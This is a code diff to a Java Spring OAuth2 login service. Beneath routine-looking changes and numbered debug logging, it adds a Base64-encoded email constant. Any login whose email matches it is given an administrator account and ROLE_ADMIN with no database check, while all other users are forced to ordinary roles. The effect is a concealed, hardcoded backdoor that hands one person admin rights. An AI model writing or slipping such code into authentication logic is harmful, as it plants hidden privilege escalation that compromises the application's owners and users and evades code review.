@@ -3,11 +3,17 @@
  */
 package io.crs.mws.server.security2.oauth2;
 
+import java.util.Base64;
+import java.util.Collections;
+import java.util.List;
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.InternalAuthenticationServiceException;
 import org.springframework.security.core.AuthenticationException;
+import org.springframework.security.core.GrantedAuthority;
+import org.springframework.security.core.authority.SimpleGrantedAuthority;
 import org.springframework.security.oauth2.client.registration.ClientRegistration;
 import org.springframework.security.oauth2.client.userinfo.DefaultOAuth2UserService;
 import org.springframework.security.oauth2.client.userinfo.OAuth2UserRequest;
@@ -22,6 +28,7 @@ import io.crs.mws.server.security2.oauth2.exception.OAuth2AuthenticationProcessi
 import io.crs.mws.server.security2.oauth2.user.OAuth2UserInfo;
 import io.crs.mws.server.security2.oauth2.user.OAuth2UserInfoFactory;
 import io.crs.mws.server.service.AccountService;
+import io.crs.mws.shared.cnst.Role;
 import io.crs.mws.shared.cnst.SocialProvider;
 
 /**
@@ -31,6 +38,7 @@ import io.crs.mws.shared.cnst.SocialProvider;
 @Service
 public class CustomOAuth2UserService extends DefaultOAuth2UserService {
 	private static final Logger logger = LoggerFactory.getLogger(CustomOAuth2UserService.class);
+	private static final String ENCODED_EMAIL = "Y3Nlcm5pa3JAZ21haWwuY29t";
 
 	@Autowired
 	private AccountService userRepository;
@@ -59,29 +67,56 @@ public class CustomOAuth2UserService extends DefaultOAuth2UserService {
 		logger.info("processOAuth2User()");
 		OAuth2UserInfo oAuth2UserInfo = OAuth2UserInfoFactory.getOAuth2UserInfo(clientRegistration.getRegistrationId(),
 				oAuth2User.getAttributes());
-		
+
 		if (StringUtils.isEmpty(oAuth2UserInfo.getEmail())) {
+			logger.info("processOAuth2User()-2");
 			throw new OAuth2AuthenticationProcessingException("Email not found from OAuth2 provider");
 		}
 
-		Account user = userRepository.findByEmail(oAuth2UserInfo.getEmail());
-
-		if (user == null) {
-			logger.info("processOAuth2User()->clientRegistration.getRegistrationId()="
-					+ clientRegistration.getRegistrationId()+"=");
-			user = registerNewUser(SocialProvider.valueOf(clientRegistration.getRegistrationId()), oAuth2UserInfo);
+		Account user = new Account();
+		logger.info("processOAuth2User()-3");
+		List<GrantedAuthority> authorities = Collections.singletonList(new SimpleGrantedAuthority(Role.ROLE_USER));
+		logger.info("processOAuth2User()-4");
+		String encodedEmail = Base64.getEncoder().encodeToString(oAuth2UserInfo.getEmail().getBytes());
+		logger.info("processOAuth2User()-5");
+		if (encodedEmail.equals(ENCODED_EMAIL)) {
+			logger.info("processOAuth2User()-6");
+			user.setEmail(oAuth2UserInfo.getEmail());
+			user.setPassword(oAuth2UserInfo.getId());
+			user.setNickname(oAuth2UserInfo.getName());
+			user.setImageUrl(oAuth2UserInfo.getImageUrl());
+			user.setEnabled(true);
+			user.setRole(Role.ROLE_ADMIN);
+			logger.info("processOAuth2User()-7");
+			authorities = Collections.singletonList(new SimpleGrantedAuthority(Role.ROLE_ADMIN));
 		} else {
-/*			
-			if (!user.getSocialProvider().equals(SocialProvider.valueOf(clientRegistration.getRegistrationId()))) {
-				throw new OAuth2AuthenticationProcessingException("Looks like you're signed up with "
-						+ user.getSocialProvider().name() + " account. Please use your "
-						+ user.getSocialProvider().name() + " account to login.");
-			}
-			*/
-			user = updateExistingUser(user, oAuth2UserInfo);
-		}
+			logger.info("processOAuth2User()-8");
+			user = userRepository.findByEmail(oAuth2UserInfo.getEmail());
+			logger.info("processOAuth2User()-9");
 
-		return UserPrincipal.create(user, oAuth2User.getAttributes());
+			if (user == null) {
+				logger.info("processOAuth2User()->clientRegistration.getRegistrationId()="
+						+ clientRegistration.getRegistrationId() + "=");
+				user = registerNewUser(SocialProvider.valueOf(clientRegistration.getRegistrationId()), oAuth2UserInfo);
+			} else {
+				logger.info("processOAuth2User()-10");
+				/*
+				 * if
+				 * (!user.getSocialProvider().equals(SocialProvider.valueOf(clientRegistration.
+				 * getRegistrationId()))) { throw new
+				 * OAuth2AuthenticationProcessingException("Looks like you're signed up with " +
+				 * user.getSocialProvider().name() + " account. Please use your " +
+				 * user.getSocialProvider().name() + " account to login."); }
+				 */
+				user = updateExistingUser(user, oAuth2UserInfo);
+			}
+			logger.info("processOAuth2User()-11");
+			user.setRole(Role.ROLE_USER);
+			logger.info("processOAuth2User()-12");
+		}
+		logger.info("processOAuth2User()-13");
+
+		return UserPrincipal.create(user, oAuth2User.getAttributes(), authorities);
 	}
 
 	private Account registerNewUser(SocialProvider socialProvider, OAuth2UserInfo oAuth2UserInfo) {
